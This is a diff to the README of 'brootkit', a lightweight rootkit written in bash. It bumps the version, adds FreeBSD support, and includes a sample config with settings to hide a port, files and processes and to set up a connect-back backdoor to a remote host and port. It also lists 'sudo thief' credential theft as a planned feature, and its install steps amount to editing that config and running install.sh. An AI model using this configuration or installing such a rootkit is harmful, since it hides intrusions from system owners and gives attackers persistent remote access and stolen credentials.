@@ -1,5 +1,5 @@
 ######BROOTKIT
-    Lightweight rootkit implemented by bash shell scripts v0.08
+    Lightweight rootkit implemented by bash shell scripts v0.10
     
     by wzt 2015   wzt.wzt@gmail.com
     
@@ -22,11 +22,14 @@
     3. ubuntu
     4. debian
     5. fedroa
+    6. freebsd
 
 ######TUDO
     1. sudo thief support.
 
 ######INSTALL
+
+    Linux distribution systems.
 
     1. edit br.conf first
 
@@ -78,8 +81,29 @@
 
       [>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>]     10/10     6 s
 
-      www.wooyun.org: 80
+    www.wooyun.org: 80
 
+    Freebsd system
+    on the modern freebsd system, root use csh by default, the other users
+    use sh default. this version brootkit can only support sh based features.
+
+    1. edit brsh.conf first
+
+    brshootkit config file, only one argument support.
+
+      #the port will be hide.
+      HIDE_PORT               8080
+      #the files will be hide file.
+      HIDE_FILE               brsh
+      #the process will be hide process.
+      HIDE_PROC               sh
+      #the connect back host domain name or ip address.
+      REMOTE_HOST             localhost
+      #the connect back host port.
+      REMOTE_PORT             8080
+      #the connect backdoor base sleep time.
+      SLEEP_TIME              60
+    2. ./install.sh
 
 ######SOURCE
     https://github.com/cloudsec/brootkit
